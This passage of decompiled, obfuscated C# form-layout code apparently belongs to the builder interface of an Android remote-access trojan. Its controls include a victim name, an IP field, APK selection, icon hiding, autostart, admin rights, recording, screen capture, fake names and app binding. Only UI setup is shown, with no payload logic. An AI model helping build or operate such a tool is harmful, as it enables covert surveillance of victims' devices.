            ((Build) this).checkver.DropDownStyle = UIDropDownStyle.DropDownList;
            ((Build) this).checkver.FillColor = Color.Black;
            ((Build) this).checkver.Font = new Font(EXGuarder.\u00339780D77, 11f);
            num1 = (int) num2 * 524648487 ^ -97743726;
            continue;
          case 931:
            ((Build) this).Panel3.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * -1420217467 ^ 1356960452;
            continue;
          case 932:
            ((Build) this).Button1.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -1219026879 ^ 203540353;
            continue;
          case 933:
            ((Build) this).CheckHidePrims.Size = new Size(338, 29);
            num1 = (int) num2 * 1130602785 ^ 1826292807;
            continue;
          case 934:
            ((Build) this).TabPage9.SuspendLayout();
            ((Build) this).Panel3.SuspendLayout();
            num1 = (int) num2 * 1782908742 ^ -635750737;
            continue;
          case 935:
            ((Build) this).CheckSkipre.TextAlign = ContentAlignment.TopCenter;
            ((Build) this).bndbtntext.BackColor = Color.FromArgb(0, 0, 17);
            num1 = (int) num2 * -997307214 ^ 566265160;
            continue;
          case 936:
            ((Build) this).TabPage11.ResumeLayout(false);
            num1 = (int) num2 * 1307421172 ^ -1491530395;
            continue;
          case 937:
            ((Build) this).checkcatpure.Location = new Point(95, 31);
            num1 = (int) num2 * -752796284 ^ 1437406877;
            continue;
          case 938:
            ((Build) this).trackIDtext.Padding = new Padding(7, 6, 7, 6);
            num1 = (int) num2 * -1221416767 ^ 1355128687;
            continue;
          case 939:
            ((Build) this).TABCTRL.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -585421226 ^ 687307281;
            continue;
          case 940:
            ((Build) this).checksignver.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).checksignver.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Build) this).checksignver.Size = new Size(110, 25);
            ((Build) this).checksignver.Style = UIStyle.Custom;
            num1 = (int) num2 * -187055459 ^ 1276203893;
            continue;
          case 941:
            ((Build) this).Textfakelink.TabIndex = 96;
            num1 = (int) num2 * 627940735 ^ 298297650;
            continue;
          case 942:
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).Label37);
            num1 = (int) num2 * 150553539 ^ -23025172;
            continue;
          case 943:
            ((Build) this).Label48.TabIndex = 103;
            num1 = (int) num2 * -2142895299 ^ 969969209;
            continue;
          case 944:
            ((Build) this).logtitletext.Margin = new Padding(4, 5, 4, 5);
            num1 = (int) num2 * -1553895655 ^ -1743958841;
            continue;
          case 945:
            ((Build) this).Label48.Text = EXGuarder.\u00378442545;
            ((Build) this).Label48.TextAlign = ContentAlignment.MiddleLeft;
            num1 = (int) num2 * -2075754211 ^ -2136884486;
            continue;
          case 946:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).Label1);
            num1 = (int) num2 * 978309317 ^ -189499021;
            continue;
          case 947:
            ((Build) this).TabPage13.Name = EXGuarder.\u003120C2D51;
            ((Build) this).TabPage13.Size = new Size(450, 230);
            ((Build) this).TabPage13.TabIndex = 5;
            num1 = (int) num2 * 331857308 ^ -434504502;
            continue;
          case 948:
            ((Build) this).Panel4 = new Panel();
            num1 = (int) num2 * -1083025174 ^ 1164484043;
            continue;
          case 949:
            ((Build) this).Label21.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label21.Location = new Point(37, 162);
            num1 = (int) num2 * 160526540 ^ 300019586;
            continue;
          case 950:
            ((Build) this).checkunlocker.ForeColor = Color.White;
            ((Build) this).checkunlocker.Location = new Point(83, 410);
            ((Build) this).checkunlocker.Name = EXGuarder.\u003422E630F;
            ((Build) this).checkunlocker.Padding = new Padding(22, 0, 0, 0);
            ((Build) this).checkunlocker.Size = new Size(338, 29);
            ((Build) this).checkunlocker.Style = UIStyle.Custom;
            ((Build) this).checkunlocker.TabIndex = 105;
            num1 = (int) num2 * -941892378 ^ -2019700587;
            continue;
          case 951:
            ((Build) this).Notmsg.Location = new Point(184, 171);
            num1 = (int) num2 * 1772582808 ^ -806058442;
            continue;
          case 952:
            ((Build) this).Label43.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label43.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * 1344377146 ^ 314657787;
            continue;
          case 953:
            ((Build) this).checkver.MinimumSize = new Size(63, 0);
            ((Build) this).checkver.Name = EXGuarder.\u003050C3778;
            ((Build) this).checkver.Padding = new Padding(0, 0, 30, 0);
            num1 = (int) num2 * -1161573361 ^ -2097382060;
            continue;
          case 954:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).explainoptionstext);
            num1 = (int) num2 * -1400899401 ^ 1320987883;
            continue;
          case 955:
            ((Build) this).Label39.Text = EXGuarder.\u0032C711604;
            ((Build) this).Label39.TextAlign = ContentAlignment.MiddleCenter;
            ((Build) this).Label39.Visible = false;
            ((Build) this).Panel1.BackColor = Color.Black;
            ((Build) this).Panel1.Controls.Add((Control) ((Build) this).checkprotector);
            ((Build) this).Panel1.Controls.Add((Control) ((Build) this).Label19);
            num1 = (int) num2 * -635395566 ^ -1335980770;
            continue;
          case 956:
            ((Build) this).Label23.AutoSize = true;
            num1 = (int) num2 * -667227606 ^ -108390927;
            continue;
          case 957:
            ((Build) this).Label4.ForeColor = Color.White;
            num1 = (int) num2 * 1181334575 ^ 478848962;
            continue;
          case 958:
            ((Build) this).idmonitor.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * -1409627268 ^ -1095910660;
            continue;
          case 959:
            ((Build) this).cusomupdateimg.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u0032D59185D);
            ((Build) this).cusomupdateimg.Location = new Point(602, 123);
            num1 = (int) num2 * -1660822441 ^ -993868106;
            continue;
          case 960:
            ((Build) this).PictureBox2.Margin = new Padding(4);
            num1 = (int) num2 * -390899879 ^ 40863226;
            continue;
          case 961:
            ((Build) this).keeplivelabel.AutoSize = true;
            num1 = (int) num2 * -275515804 ^ -1352813193;
            continue;
          case 962:
            ((Build) this).Label36.BackColor = Color.Transparent;
            num1 = (int) num2 * 960530157 ^ 456350180;
            continue;
          case 963:
            ((Build) this).Label33.TabIndex = 65;
            num1 = (int) num2 * 1363206448 ^ -866077837;
            continue;
          case 964:
            ((Build) this).Label8.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 729168293 ^ -2113110103;
            continue;
          case 965:
            ((Build) this).Label6.Name = EXGuarder.\u0030F28653E;
            ((Build) this).Label6.Size = new Size(16, 19);
            num1 = (int) num2 * 1300280207 ^ -185831083;
            continue;
          case 966:
            ((Build) this).comboproms.ForeColor = Color.White;
            ((Build) this).comboproms.Items.AddRange(new object[11]
            {
              (object) EXGuarder.\u003395E0B57,
              (object) EXGuarder.\u00304384C4B,
              (object) EXGuarder.\u0032578785E,
              (object) EXGuarder.\u0031D365F1C,
              (object) EXGuarder.\u00368410F5F,
              (object) EXGuarder.\u0036222734D,
              (object) EXGuarder.\u0030A3D610B,
              (object) EXGuarder.\u0031369351A,
              (object) EXGuarder.\u00378406005,
              (object) EXGuarder.\u003371C3B14,
              (object) EXGuarder.\u003183D6403
            });
            num1 = (int) num2 * 1198015817 ^ 1176206392;
            continue;
          case 967:
            ((Build) this).Panel6.BackColor = Color.Black;
            ((Build) this).Panel6.Controls.Add((Control) ((Build) this).logbtntext);
            num1 = (int) num2 * -933770583 ^ -1801629822;
            continue;
          case 968:
            ((Build) this).checkemo.Style = UIStyle.Custom;
            num1 = (int) num2 * 2046031935 ^ 1862785127;
            continue;
          case 969:
            ((Build) this).Label45.Enabled = false;
            num1 = (int) num2 * 110905110 ^ 591220813;
            continue;
          case 970:
            ((Build) this).removeactiv.SymbolSize = 30;
            ((Build) this).removeactiv.TabIndex = 100;
            num1 = (int) num2 * -1578073431 ^ -1503588831;
            continue;
          case 971:
            ((Build) this).DrakeUIAvatar1.Location = new Point(54, 346);
            ((Build) this).DrakeUIAvatar1.Margin = new Padding(4);
            ((Build) this).DrakeUIAvatar1.Name = EXGuarder.\u00373182D5A;
            num1 = (int) num2 * -913640646 ^ -59188621;
            continue;
          case 972:
            ((Build) this).Label42.ForeColor = Color.White;
            num1 = (int) num2 * 469941472 ^ -720378174;
            continue;
          case 973:
            ((Build) this).po = new DrakeUITextBox();
            num1 = (int) num2 * 1399604870 ^ -1613457684;
            continue;
          case 974:
            ((Build) this).Label34.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1129133618 ^ -143311031;
            continue;
          case 975:
            ((Build) this).Label17.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -1984714980 ^ -766007345;
            continue;
          case 976:
            ((Build) this).Label41.Size = new Size(16, 19);
            ((Build) this).Label41.TabIndex = 92;
            ((Build) this).Label41.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * -1605653745 ^ 468619057;
            continue;
          case 977:
            ((Build) this).Label38.BackColor = Color.Transparent;
            ((Build) this).Label38.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label38.ForeColor = Color.FromArgb(65, 177, 225);
            ((Build) this).Label38.Location = new Point(55, 375);
            num1 = (int) num2 * 1796439164 ^ -1406454697;
            continue;
          case 978:
            ((Build) this).TextNameVictim.Radius = 10;
            ((Build) this).TextNameVictim.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).TextNameVictim.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num2 * 939603678 ^ -1503437990;
            continue;
          case 979:
            ((Build) this).Button1.Style = UIStyle.Custom;
            ((Build) this).Button1.SymbolSize = 0;
            ((Build) this).Button1.TabIndex = 97;
            num1 = (int) num2 * 543750788 ^ -1869465633;
            continue;
          case 980:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).Label3);
            num1 = (int) num2 * -851055036 ^ -817994677;
            continue;
          case 981:
            ((Build) this).namemonitor.Cursor = Cursors.IBeam;
            ((Build) this).namemonitor.FillColor = Color.Black;
            num1 = (int) num2 * 504855447 ^ -1599479162;
            continue;
          case 982:
            ((Build) this).MainText.Location = new Point(181, 69);
            num1 = (int) num2 * -307054744 ^ -44485542;
            continue;
          case 983:
            ((Build) this).trgtbkg.TextAlignment = ContentAlignment.TopCenter;
            ((Build) this).trgtbkg.Watermark = EXGuarder.\u00368727503;
            num1 = (int) num2 * -1716690489 ^ 259873721;
            continue;
          case 984:
            ((Build) this).checksignver.BackColor = Color.Transparent;
            num1 = (int) num2 * -784397066 ^ 1337745594;
            continue;
          case 985:
            ((Build) this).box.BorderStyle = BorderStyle.FixedSingle;
            ((Build) this).box.Controls.Add((Control) ((Build) this).TABCTRL);
            num1 = (int) num2 * 1452362757 ^ 390591501;
            continue;
          case 986:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).TextSize);
            num1 = (int) num2 * 109307758 ^ 1175860264;
            continue;
          case 987:
            ((Build) this).PictureBox2.Image = (Image) componentResourceManager.GetObject(EXGuarder.\u0032F78091D);
            ((Build) this).PictureBox2.Location = new Point(291, 27);
            num1 = (int) num2 * -14574548 ^ 244780705;
            continue;
          case 988:
            ((Build) this).TextPackage.Font = new Font(EXGuarder.\u00339780D77, 12f);
            ((Build) this).TextPackage.ForeColor = Color.White;
            num1 = (int) num2 * -1546559240 ^ -303197020;
            continue;
          case 989:
            ((Build) this).Label5.Visible = false;
            num1 = (int) num2 * 2106525414 ^ 1807915370;
            continue;
          case 990:
            ((Build) this).Label28.Location = new Point(119, 37);
            num1 = (int) num2 * 1066980106 ^ -450369355;
            continue;
          case 991:
            ((Build) this).Label27.BackColor = Color.Transparent;
            ((Build) this).Label27.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label27.ForeColor = Color.White;
            ((Build) this).Label27.Location = new Point(178, 12);
            num1 = (int) num2 * 490670929 ^ 769633318;
            continue;
          case 992:
            ((Build) this).Label3.Size = new Size(98, 24);
            num1 = (int) num2 * -348215240 ^ 1514965013;
            continue;
          case 993:
            ((Build) this).TextPackage.Margin = new Padding(5, 6, 5, 6);
            num1 = (int) num2 * 1337113720 ^ 286248700;
            continue;
          case 994:
            ((Build) this).Panel4.Name = EXGuarder.\u003410F5778;
            ((Build) this).Panel4.Size = new Size(518, 240);
            num1 = (int) num2 * 1094257722 ^ 416934922;
            continue;
          case 995:
            ((Build) this).Label1.Text = EXGuarder.\u0030C0D7568;
            ((Build) this).MainText.AutoSize = true;
            num1 = (int) num2 * -1773183773 ^ -1179495771;
            continue;
          case 996:
            ((Build) this).TabPage14.Location = new Point(0, 40);
            ((Build) this).TabPage14.Name = EXGuarder.\u003121F650B;
            num1 = (int) num2 * 1603007630 ^ -270909814;
            continue;
          case 997:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).CheckFakeSize);
            num1 = (int) num2 * -1868285466 ^ 1550228540;
            continue;
          case 998:
            this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
            num1 = (int) num2 * -33959839 ^ -1195415556;
            continue;
          case 999:
            ((Build) this).Label40.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num2 * -17422904 ^ 1050503731;
            continue;
          case 1000:
            ((Build) this).listmonitor.ItemHeight = 30;
            ((Build) this).listmonitor.ItemSelectBackColor = Color.FromArgb(140, 140, 140);
            num1 = (int) num2 * 1366950254 ^ 1482023146;
            continue;
          case 1001:
            ((Build) this).cusomupdateimg.Enabled = false;
            num1 = (int) num2 * 1072793801 ^ -492108995;
            continue;
          case 1002:
            ((Build) this).CheckSkipre.Cursor = Cursors.Hand;
            num1 = (int) num2 * -315722579 ^ -2139710618;
            continue;
          case 1003:
            ((Build) this).Label20.TabIndex = 37;
            num1 = (int) num2 * 239317741 ^ -1060897630;
            continue;
          case 1004:
            ((Build) this).checkcaptureonce.Enabled = false;
            num1 = (int) num2 * -1176953297 ^ -12660416;
            continue;
          case 1005:
            ((Build) this).Label1.BackColor = Color.Transparent;
            ((Build) this).Label1.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label1.ForeColor = Color.White;
            ((Build) this).Label1.Location = new Point(715, 69);
            num1 = (int) num2 * 261834453 ^ -1174209058;
            continue;
          case 1006:
            ((Build) this).Label35.Margin = new Padding(4, 0, 4, 0);
            ((Build) this).Label35.Name = EXGuarder.\u00321505C07;
            num1 = (int) num2 * 1023458281 ^ 197115154;
            continue;
          case 1007:
            ((Build) this).removeactiv.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -424320286 ^ 1762060262;
            continue;
          case 1008:
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = EXGuarder.\u00379345157;
            num1 = (int) num2 * -319995653 ^ -2007804435;
            continue;
          case 1009:
            ((Build) this).idmonitor.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num2 * 2128665801 ^ -621978932;
            continue;
          case 1010:
            ((Build) this).Panel3.Name = EXGuarder.\u003063A5267;
            num1 = (int) num2 * 187256359 ^ 381168984;
            continue;
          case 1011:
            ((Build) this).bindbodytext.Text = EXGuarder.\u00353624566;
            num1 = (int) num2 * 1151236178 ^ 382310757;
            continue;
          case 1012:
            ((Build) this).Panel1.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -892809964 ^ -639491809;
            continue;
          case 1013:
            goto label_3;
          case 1014:
            ((Build) this).delayaccesstext.Location = new Point(79, 484);
            num1 = (int) num2 * 698301463 ^ -2009513749;
            continue;
          case 1015:
            ((Build) this).logbtntext.Name = EXGuarder.\u0035979671C;
            num1 = (int) num2 * -205279031 ^ -1049354413;
            continue;
          case 1016:
            ((Build) this).Label3.TabIndex = 26;
            ((Build) this).Label3.Text = EXGuarder.\u0033476260C;
            num1 = (int) num2 * -1139138423 ^ -2137158870;
            continue;
          case 1017:
            ((Build) this).SelectedApk.Margin = new Padding(4);
            num1 = (int) num2 * 169411571 ^ 223988381;
            continue;
          case 1018:
            ((Build) this).CheckHide.Size = new Size(150, 29);
            num1 = (int) num2 * 1171809177 ^ -951081779;
            continue;
          case 1019:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).CheckHide);
            num1 = (int) num2 * -410373160 ^ 320776268;
            continue;
          case 1020:
            ((Build) this).Button3.Text = EXGuarder.\u00356520F41;
            ((Build) this).Button3.UseVisualStyleBackColor = false;
            ((Build) this).logbodytext.BackColor = Color.FromArgb(0, 39, 81);
            ((Build) this).logbodytext.BorderStyle = BorderStyle.FixedSingle;
            num1 = (int) num2 * 1877275111 ^ -1051015447;
            continue;
          case 1021:
            ((Build) this).CheckRecord.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -1026174624 ^ 1665915981;
            continue;
          case 1022:
            ((Build) this).Label4.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * -1127962299 ^ -1184219521;
            continue;
          case 1023:
            ((Build) this).CheckIconPatch.Text = EXGuarder.\u00300072740;
            num1 = (int) num2 * 1163534177 ^ 849240568;
            continue;
          case 1024:
            ((Build) this).Label16.Size = new Size(16, 19);
            num1 = (int) num2 * -1589811195 ^ -377584570;
            continue;
          case 1025:
            ((Build) this).Label32 = new Label();
            ((Build) this).Button3 = new Button();
            num1 = (int) num2 * -1107623609 ^ 1791575035;
            continue;
          case 1026:
            ((Build) this).Label30.Location = new Point(123, 364);
            num1 = (int) num2 * 1800639953 ^ -130463458;
            continue;
          case 1027:
            ((Build) this).TABCTRL.Style = UIStyle.Custom;
            ((Build) this).TABCTRL.TabBackColor = Color.Black;
            num1 = (int) num2 * 643985343 ^ -650013258;
            continue;
          case 1028:
            ((Build) this).DrakeUIAvatar1.ForeColor = Color.White;
            num1 = (int) num2 * -169334120 ^ 1681684866;
            continue;
          case 1029:
            ((Build) this).Label3.AutoSize = true;
            num1 = (int) num2 * 168994963 ^ -1296460253;
            continue;
          case 1030:
            ((Build) this).Panel9.Controls.Add((Control) ((Build) this).Label8);
            num1 = (int) num2 * -1852918848 ^ -1961285352;
            continue;
          case 1031:
            ((Build) this).linkmonitor = new DrakeUITextBox();
            ((Build) this).Panel10 = new Panel();
            num1 = (int) num2 * -1629699943 ^ -823831357;
            continue;
          case 1032:
            ((Build) this).explainoptionstext.Name = EXGuarder.\u00315160E73;
            num1 = (int) num2 * 775126385 ^ -953450931;
            continue;
          case 1033:
            ((Build) this).comboproms.Font = new Font(EXGuarder.\u00339780D77, 11f);
            num1 = (int) num2 * 420347835 ^ -1155595336;
            continue;
          case 1034:
            ((Build) this).Label25.ForeColor = Color.White;
            ((Build) this).Label25.Location = new Point(4, 175);
            num1 = (int) num2 * 2014832604 ^ 228835665;
            continue;
          case 1035:
            ((Build) this).tracklist.Text = (string) null;
            ((Build) this).trakertitle.AutoSize = true;
            num1 = (int) num2 * 990321577 ^ -237808566;
            continue;
          case 1036:
            ((Build) this).TabPage9.Location = new Point(0, 55);
            num1 = (int) num2 * 1072016653 ^ 1483005481;
            continue;
          case 1037:
            ((Build) this).CheckAOX.Cursor = Cursors.Hand;
            ((Build) this).CheckAOX.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -747228465 ^ 226669131;
            continue;
          case 1038:
            this.ForeColor = Color.FromArgb(240, 240, 240);
            num1 = (int) num2 * 1947483819 ^ 1115973909;
            continue;
          case 1039:
            ((Build) this).fakepanel.Controls.Add((Control) ((Build) this).Label22);
            ((Build) this).fakepanel.Enabled = false;
            num1 = (int) num2 * -866923547 ^ 594190240;
            continue;
          case 1040:
            ((Build) this).Panel4.Controls.Add((Control) ((Build) this).Label25);
            num1 = (int) num2 * 2041660169 ^ 1565024460;
            continue;
          case 1041:
            ((Build) this).Label2.AutoSize = true;
            ((Build) this).Label2.BackColor = Color.Transparent;
            num1 = (int) num2 * 441434725 ^ 1069708278;
            continue;
          case 1042:
            ((Build) this).TABCTRL.Location = new Point(0, 0);
            num1 = (int) num2 * 1949628532 ^ -1825832166;
            continue;
          case 1043:
            ((Build) this).linkmonitor.Name = EXGuarder.\u0036832262D;
            num1 = (int) num2 * 1776465366 ^ -879458899;
            continue;
          case 1044:
            ((Build) this).Label11.TabIndex = 108;
            num1 = (int) num2 * 1177217436 ^ -1818570510;
            continue;
          case 1045:
            ((Build) this).CheckFakeSize.Checked = true;
            num1 = (int) num2 * -1058162058 ^ -1376671701;
            continue;
          case 1046:
            ((Build) this).Label4 = new Label();
            ((Build) this).Label9 = new Label();
            num1 = (int) num2 * 1258787725 ^ -774281989;
            continue;
          case 1047:
            ((Build) this).CheckHide.Name = EXGuarder.\u003364C366F;
            ((Build) this).CheckHide.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num2 * -2033063173 ^ -626923686;
            continue;
          case 1048:
            ((Build) this).Label15.Location = new Point(57, 31);
            num1 = (int) num2 * 1116968134 ^ 1208837125;
            continue;
          case 1049:
            ((Build) this).panemnitor.ResumeLayout(false);
            ((Build) this).panemnitor.PerformLayout();
            ((Build) this).Panel10.ResumeLayout(false);
            ((Build) this).Panel10.PerformLayout();
            ((Build) this).TabPage14.ResumeLayout(false);
            num1 = (int) num2 * -1745515794 ^ -312943187;
            continue;
          case 1050:
            ((Build) this).trgtbkg.Size = new Size(231, 27);
            ((Build) this).trgtbkg.Style = UIStyle.Custom;
            num1 = (int) num2 * -2075565182 ^ 273311018;
            continue;
          case 1051:
            ((Build) this).Panel9.Dock = DockStyle.Left;
            num1 = (int) num2 * 758555147 ^ -1511210732;
            continue;
          case 1052:
            ((Build) this).Button1.RectHoverColor = Color.White;
            num1 = (int) num2 * -1853442139 ^ 1515810318;
            continue;
          case 1053:
            ((Build) this).Label22.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num2 * 623267323 ^ 1037729614;
            continue;
          case 1054:
            ((Build) this).Panel6 = new Panel();
            num1 = (int) num2 * -761979664 ^ -269052987;
            continue;
          case 1055:
            ((Build) this).checkemo.Font = new Font(EXGuarder.\u00339780D77, 12f);
            num1 = (int) num2 * -52612403 ^ -1491443051;
            continue;
          case 1056:
            ((Build) this).listmonitor.Padding = new Padding(7);
            num1 = (int) num2 * 1099955180 ^ 1170601244;
            continue;
          case 1057:
            ((Build) this).TextVersion.Maximum = (double) int.MaxValue;
            num1 = (int) num2 * 570347844 ^ -1116710635;
            continue;
          case 1058:
            ((Build) this).Label50.AutoSize = true;
            ((Build) this).Label50.BackColor = Color.Transparent;
            ((Build) this).Label50.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -29151190 ^ 1763949388;
            continue;
          case 1059:
            ((Build) this).Label25.TabIndex = 44;
            ((Build) this).Label25.Text = EXGuarder.\u003352A601C;
            num1 = (int) num2 * 1340954231 ^ 1429293692;
            continue;
          case 1060:
            ((Build) this).CheckAOX.TabIndex = 107;
            ((Build) this).CheckAOX.Text = EXGuarder.\u003654B0A70;
            num1 = (int) num2 * -1338516260 ^ -319215163;
            continue;
          case 1061:
            ((Build) this).CheckBIND.Location = new Point(602, 51);
            num1 = (int) num2 * -305910306 ^ -1430062546;
            continue;
          case 1062:
            ((Build) this).Label5.TabIndex = 26;
            ((Build) this).Label5.Text = EXGuarder.\u00379191E1E;
            num1 = (int) num2 * -1523182882 ^ 2059735348;
            continue;
          case 1063:
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Label30);
            ((Build) this).Panel3.Controls.Add((Control) ((Build) this).Panel4);
            num1 = (int) num2 * -1496828985 ^ -746038902;
            continue;
          case 1064:
            ((Build) this).explaintoolstext.TabIndex = 66;
            ((Build) this).Label33.AutoSize = true;
            ((Build) this).Label33.BackColor = Color.Transparent;
            ((Build) this).Label33.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * -214849440 ^ -1195447084;
            continue;
          case 1065:
            ((Build) this).bndbtntext.Cursor = Cursors.IBeam;
            num1 = (int) num2 * 1372458359 ^ 2049279371;
            continue;
          case 1066:
            ((Build) this).randomidbtn.Margin = new Padding(4);
            ((Build) this).randomidbtn.Name = EXGuarder.\u0030A6F2B50;
            num1 = (int) num2 * -218983194 ^ 779932787;
            continue;
          case 1067:
            ((Build) this).delayaccesstext = new TextBox();
            num1 = (int) num2 * 13456148 ^ 6507128;
            continue;
          case 1068:
            ((Build) this).Label7.TabIndex = 34;
            num1 = (int) num2 * 368302101 ^ -1731691453;
            continue;
          case 1069:
            ((Build) this).TABCTRL.TabSelectedForeColor = Color.FromArgb(30, 136, 229);
            num1 = (int) num2 * 2115860442 ^ -1976927162;
            continue;
          case 1070:
            ((Build) this).Panel2.Controls.Add((Control) ((Build) this).MainText);
            num1 = (int) num2 * -1635359940 ^ -1733189388;
            continue;
          case 1071:
            ((Build) this).Label23.Size = new Size(112, 17);
            ((Build) this).Label23.TabIndex = 39;
            ((Build) this).Label23.Text = EXGuarder.\u0031B17632B;
            ((Build) this).Label22.AutoSize = true;
            num1 = (int) num2 * 1581563958 ^ -1341715813;
            continue;
          case 1072:
            ((Build) this).Label19.Dock = DockStyle.Left;
            ((Build) this).Label19.Font = new Font(EXGuarder.\u00339780D77, 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            ((Build) this).Label19.ForeColor = Color.White;
            num1 = (int) num2 * -696044479 ^ 1979468100;
            continue;
          case 1073:
            ((Build) this).Label3.BackColor = Color.Transparent;
            ((Build) this).Label3.Font = new Font(EXGuarder.\u00339780D77, 15f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num2 * 906846769 ^ -994969214;
            continue;
          case 1074:
            ((Build) this).Textfakename.Padding = new Padding(7, 6, 7, 6);
            ((Build) this).Textfakename.Radius = 10;
            num1 = (int) num2 * 1768806140 ^ -839434680;
            continue;
          case 1075:
            ((Build) this).checkautostart.ForeColor = Color.White;
            num1 = (int) num2 * -1869642593 ^ -1365604171;
            continue;
          case 1076:
            ((Build) this).Label10.Text = EXGuarder.\u003500A6952;
            num1 = (int) num2 * -2067897105 ^ -1960408054;
            continue;
          case 1077:
            ((Build) this).checkautostart.Location = new Point(83, 130);
            ((Build) this).checkautostart.Name = EXGuarder.\u003113E126C;
            num1 = (int) num2 * -601992298 ^ -443705822;
            continue;
          case 1078:
            ((Build) this).TextVersion.ForeColor = Color.White;
            ((Build) this).TextVersion.Location = new Point(102, 391);
            num1 = (int) num2 * 1988010815 ^ 1033856377;
            continue;
          case 1079:
            ((Build) this).TextIP.Radius = 10;
            ((Build) this).TextIP.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            ((Build) this).TextIP.RectDisableColor = Color.FromArgb(227, 242, 253);
            ((Build) this).TextIP.Size = new Size(262, 27);
            ((Build) this).TextIP.Style = UIStyle.Custom;
            num1 = (int) num2 * -1459777157 ^ 386581075;
            continue;
          case 1080:
            ((Build) this).TextVersion.Watermark = EXGuarder.\u0031D752713;
            ((Build) this).randomverbtn.AvatarSize = 30;
            ((Build) this).randomverbtn.BackColor = Color.Transparent;
            num1 = (int) num2 * -1295344035 ^ -2007547813;
            continue;
          case 1081:
            ((Build) this).Textfakename.Watermark = EXGuarder.\u0033476260C;
            num1 = (int) num2 * -149474710 ^ 1499724186;
            continue;
          case 1082:
            ((Build) this).CheckDoze.TabIndex = 71;
            num1 = (int) num2 * -1016228548 ^ -1790416215;
            continue;
          case 1083:
            ((Build) this).Panel3.TabIndex = 12;
            num1 = (int) num2 * -2051882227 ^ -513550999;
            continue;
          case 1084:
            ((Build) this).TextNamePatch.Name = EXGuarder.\u003231F2A2E;
            num1 = (int) num2 * 28072035 ^ -1144970612;
            continue;
          case 1085:
            ((Build) this).Button1.BackColor = Color.Transparent;
            num1 = (int) num2 * -74045145 ^ -374287623;
            continue;
          case 1086:
            ((Build) this).TabPage14.TabIndex = 6;
            ((Build) this).TabPage14.Text = EXGuarder.\u003371F595F;
            ((Build) this).TextBox1.BackColor = Color.FromArgb(10, 10, 10);
            num1 = (int) num2 * 1007441672 ^ 1834652099;
            continue;
          case 1087:
            ((Build) this).Panel1.Controls.Add((Control) ((Build) this).SelectedApk);
            ((Build) this).Panel1.Controls.Add((Control) ((Build) this).checksignver);
            num1 = (int) num2 * 683799628 ^ 1044914519;
            continue;
          case 1088:
            ((Build) this).logbtntext = new DrakeUITextBox();
            ((Build) this).Label37 = new Label();
            num1 = (int) num2 * 654632353 ^ 1381020764;
            continue;
          case 1089:
            ((Build) this).TextNamePatch.Style = UIStyle.Custom;
            ((Build) this).TextNamePatch.TabIndex = 96;
            num1 = (int) num2 * 1526296839 ^ 352982197;
            continue;
          case 1090:
            ((Build) this).trgtbkg.ForeColor = Color.White;
            num1 = (int) num2 * -1969557138 ^ 464040364;
            continue;
          case 1091:
            ((Build) this).Textfakelink.Location = new Point(231, 144);
            num1 = (int) num2 * 1436613906 ^ 338624320;
            continue;
          case 1092:
            ((Build) this).logtitletext.Font = new Font(EXGuarder.\u00339780D77, 11f, FontStyle.Bold);
            num1 = (int) num2 * 1475712567 ^ -867177805;
            continue;
          case 1093:
            ((Build) this).explainmonitortext.TabIndex = 67;
            ((Build) this).panemnitor.Controls.Add((Control) ((Build) this).Label44);
            num1 = (int) num2 * 1809634023 ^ -1616683220;
            continue;
          case 1094:
            ((Build) this).checkadmin.Padding = new Padding(22, 0, 0, 0);
